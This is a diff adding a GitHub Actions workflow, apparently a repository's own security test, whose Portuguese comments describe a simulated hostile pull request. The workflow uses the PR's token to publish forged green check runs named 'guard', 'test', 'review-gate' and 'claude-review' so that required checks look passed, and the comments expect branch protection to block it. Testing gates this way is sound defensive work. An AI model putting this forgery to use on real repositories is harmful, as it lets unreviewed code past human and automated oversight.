@@ -1,0 +1,25 @@
+# TESTE N0 (BLK-ORQ-21) — PROVA DE SEGURANCA, PARA SER FECHADO SEM MERGE.
+# Simula um PR hostil que tenta FORJAR o portao: publica check runs VERDES com os
+# nomes obrigatorios (guard/test) a partir do proprio PR, declarando checks:write.
+# Se o portao estiver correto, o PR fica BLOQUEADO mesmo assim (CODEOWNERS de /.github/
+# exige revisao do dono; e o guard REAL fica vermelho por tocar .github/workflows).
+name: pwn-n0
+on: pull_request
+permissions:
+  checks: write
+  statuses: write
+jobs:
+  forjar:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Publicar check runs verdes homonimos
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SHA: ${{ github.event.pull_request.head.sha }}
+          REPO: ${{ github.repository }}
+        run: |
+          for nome in guard test review-gate claude-review; do
+            gh api --method POST "repos/$REPO/check-runs" \
+              -f name="$nome" -f head_sha="$SHA" \
+              -f status="completed" -f conclusion="success" || true
+          done
